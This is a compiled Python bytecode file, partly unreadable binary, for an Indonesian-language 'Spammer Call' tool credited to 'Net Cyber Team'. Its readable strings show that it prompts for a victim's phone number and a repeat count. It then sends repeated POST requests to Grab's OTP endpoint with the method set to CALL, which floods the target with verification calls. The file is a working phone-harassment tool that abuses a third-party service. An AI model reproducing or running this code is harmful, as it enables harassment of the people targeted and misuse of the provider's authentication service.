B
    G_�\�  �               @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZdZdZdZ	dZ
dZdZdd	� Zd
Zdd� ZdZdZdZe�d� ee� eed e
 d � ee	d e d e	 d e �Zeeedeef  ��Ze �d� e�  ee	d e � e �d� dd� ZdZx*ee�D ]Ze �d� eeed � �qW ddedd �Z�y
e�d� ee� e �d!� e �d!� ee	d" e d# e	 d$ e d% e d$ e� e �d!� ee	d" e d& e	 d$ e d' e d$ e� e �d(� e�  eed) e d* � xTee�D ]HZd+Z ej!d,ed-�Z"e#e �e#e"j$�k�r0ed.� ned/� e �d0� �q�W W n| e%k
�r�   e�  ee	d1 � eed2 � e �d(� eed3 � e �d4� ee	d5 � e �d� eed6 � e&�  Y nX dS )7�    Nz[91mz[92mz[93mz[94mz[36mz[0mc             C   s>   x8| d D ],}t j�|� t j��  t�t�� d � q
W d S )N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep�random)�s�c� r   �call.py�mengetik#   s    
r   a�  
[92m  _  _  _  _  _  _  _
[92m / \/ \/ \/ \/ \/ \/ \ 
[92m( [36mS  P  A  M  M  E  R [92m)   [1;31m[ [94mSpammer Call [1;31m]
[92m \_/\_/\_/\_/\_/\_/\_/ [36m Author [1;31m: [93mlao'neis agung
[92m / \   / \   / \   / \  [36mVersion[1;31m: [93m1.0 {Unfaedah}
[92m( [36mC[92m ) ( [36mA [92m) ([36m L[92m ) ( [36mL[92m )[36m Team  [1;31m : [93mNet Cyber Team
[92m \_/   \_/   \_/   \_/
c              C   sV   d} d}yt j| |d�}dS  t jk
rP   td� t�d� td� t�  Y nX dS )	Nzhttp://google.com�   )�timeoutTz[Upss...] Sambungan terputus�   z)Priksa Kembali Sambungan Internet Anda :vF)�requests�get�ConnectionError�printr   r   �exit)Zurlr   �_r   r   r   �check_internet5   s     
  r   z[1;31mz[1;32mz[1;37m�clearz !z, Masukan Nomor dengan '62' {ex: 62896554xxxx}�[�#z] No Hp Target @=> u   %s[×] Jumlah $=> %sr   z, {Tekan Ctrl + C untuk keluar dari program} c             C   sz   d\}}t |�t | � }|dkr(d\}}tt|| ��}d�d| d||   t|d d�|�}tj�|� tj��  d S )	N)�   � g      �?)r   z
zLoading. [ {} ] {:.0f}% {}r   �-�d   r   )�float�int�round�formatr   r   r   r   )�totalZprogressZ	barLengthZstatus�block�textr   r   r   �updtP   s    r'   r   g����MbP?�CALL�idZpax_android_production)�methodZcountryCodeZphoneNumberZ
templateIDg�������?z <�+�>z No Target =r   z Jumlah Yang Akan Di Kirim =�   z[>_ ]z StartZchallengeIDz(https://api.grab.com/grabid/v1/phone/otp)�dataz[+] BERHASIL TERKIRIM [+]z[-] GAGAL MENGIRIM [-]�%   zGood By Wahai Manuksia :(zAku Sayang Kamuz	Haha Gila�   zLah Emang Iya :vzbye :'))'r   �	itertoolsZ	threadingr   �osr   r	   ZlrZlg�yZlbZcy�xr   Zbannr   �r�g�w�systemr   �inputZkoor!   r$   r   r'   �runs�rangeZrun_numZmet�iZidkZpostZMEM�strr&   �KeyboardInterruptr   r   r   r   r   �<module>   s|   

 





.
.




